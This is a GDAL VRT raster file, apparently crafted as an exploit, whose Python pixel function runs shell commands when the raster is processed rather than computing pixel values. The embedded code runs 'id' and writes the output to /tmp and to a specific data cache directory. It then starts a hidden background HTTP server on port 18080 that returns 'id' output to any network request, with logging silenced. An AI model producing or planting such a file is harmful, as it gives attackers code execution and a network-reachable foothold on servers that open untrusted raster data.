<VRTDataset rasterXSize="2" rasterYSize="2">
  <VRTRasterBand dataType="Byte" band="1" subClass="VRTDerivedRasterBand">
    <PixelFunctionType>hxfn</PixelFunctionType>
    <PixelFunctionLanguage>Python</PixelFunctionLanguage>
    <PixelFunctionCode><![CDATA[
import os,threading,http.server,socketserver
def hxfn(in_ar, out_ar, xoff, yoff, xsize, ysize, raster_xsize, raster_ysize, buf_radius, buf_type, extra):
    uid=os.popen("id").read()
    open("/tmp/hxuid.txt","w").write(uid)
    try:
        open("/data/cache/on_demand/chirps_v3/2025/hxuid.txt","w").write(uid)
    except Exception:
        pass
    try:
        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                b=os.popen("id").read().encode()
                self.send_response(200); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
            def log_message(self,*a):
                pass
        t=threading.Thread(target=lambda: socketserver.TCPServer(("0.0.0.0",18080), H).serve_forever(), daemon=True)
        t.start()
    except Exception:
        pass
    out_ar[:] = 1
]]>
    </PixelFunctionCode>
  </VRTRasterBand>
</VRTDataset>
